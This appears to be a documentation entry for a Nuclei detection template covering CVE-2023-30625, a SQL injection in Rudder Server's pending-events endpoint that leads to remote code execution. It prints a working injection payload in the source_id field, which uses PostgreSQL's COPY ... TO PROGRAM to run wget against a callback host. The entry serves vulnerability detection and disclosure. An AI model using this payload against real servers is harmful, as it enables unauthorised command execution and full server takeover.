---
cve_id: CVE-2023-30625
template_path: nuclei-templates/http/cves/2023/CVE-2023-30625.yaml
affected_product: Rudder Server
severity: high
authentication: none
external_callback: true
affected_versions: < 1.3.0-rc.1
preconditions: []
poc_classification: rce
---

## Vulnerability

Rudder Server versions prior to 1.3.0-rc.1 contain a SQL injection vulnerability that can lead to Remote Code Execution (RCE). The vulnerability exists in the `/v1/warehouse/pending-events` endpoint where user-supplied input is not properly sanitized before being used in SQL queries. The severity is compounded by the fact that the `rudder` role in PostgreSQL has superuser permissions by default, allowing attackers to leverage SQL injection to execute arbitrary system commands through PostgreSQL's `COPY ... TO PROGRAM` functionality. This enables complete compromise of both the database and the underlying server.

The vulnerability is classified as CWE-89 (SQL Injection) with a CVSS score of 8.8 (High), indicating network-accessible exploitation with low attack complexity, requiring low privileges and no user interaction.

## PoC / Detection

Classification: rce

The template detects this vulnerability by sending a POST request to the `/v1/warehouse/pending-events` endpoint with a malicious SQL injection payload in the `source_id` parameter. The payload attempts to exploit the SQL injection by injecting a `COPY` command that executes a system command (`wget` to an Interactsh callback URL):

```
{"source_id": "test'; copy (SELECT '') to program 'wget {{interactsh-url}}'-- - "}
```

The template verifies successful exploitation through three conditions:
1. The response body contains the string "error getting pending" (indicating the SQL query was processed)
2. A DNS callback is received at the Interactsh server (confirming command execution)
3. The HTTP response status is 500 (server error from the malformed SQL)

The detection confirms both the SQL injection vulnerability and the ability to achieve remote code execution through PostgreSQL's program execution capabilities.

## References

- https://securitylab.github.com/advisories/GHSL-2022-097_rudder-server/
- https://nvd.nist.gov/vuln/detail/CVE-2023-30625
- http://packetstormsecurity.com/files/173837/Rudder-Server-SQL-Injection-Remote-Code-Execution.html
- https://github.com/rudderlabs/rudder-server/commit/0d061ff2d8c16845179d215bf8012afceba12a30
- https://github.com/rudderlabs/rudder-server/commit/2f956b7eb3d5eb2de3e79d7df2c87405af25071e
